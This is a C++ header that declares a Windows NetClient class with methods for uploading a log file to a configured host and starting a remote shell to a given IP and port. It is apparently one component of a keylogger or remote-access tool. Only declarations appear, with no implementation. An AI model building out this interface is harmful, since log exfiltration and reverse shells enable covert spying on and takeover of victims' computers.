#pragma once

#ifndef WIN32_LEAN_AND_MEAN
	#define WIN32_LEAN_AND_MEAN
#endif

#include <Windows.h>

class NetClient
{
public:
    NetClient(const char* p_hostip, const char* p_port, const char* p_hostname, const char* p_scriptfile, const char* p_scriptvarname, const char* p_scriptvarval);
    ~NetClient(void);

	bool UploadLog(char* filepath);
	void StartRemoteShell(const char* rhost_ip, const char* rhost_port);

private:
	NetClient();
	char hostip[MAX_PATH];
	char hostname[MAX_PATH];
	char port[MAX_PATH];
	char scriptfile[MAX_PATH];
	char scriptvarname[MAX_PATH];
	char scriptvarval[MAX_PATH];
};
